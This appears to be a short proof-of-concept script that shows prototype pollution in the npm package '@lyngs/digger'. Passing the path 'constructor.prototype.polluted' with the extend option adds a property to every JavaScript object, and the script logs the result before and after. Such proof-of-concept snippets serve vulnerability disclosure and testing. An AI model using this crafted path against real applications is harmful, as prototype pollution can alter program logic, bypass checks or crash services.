const {digger} = require('@lyngs/digger');
console.log({}.polluted);
digger({}, 'constructor.prototype.polluted', 'yes', { extend: true });
console.log({}.polluted);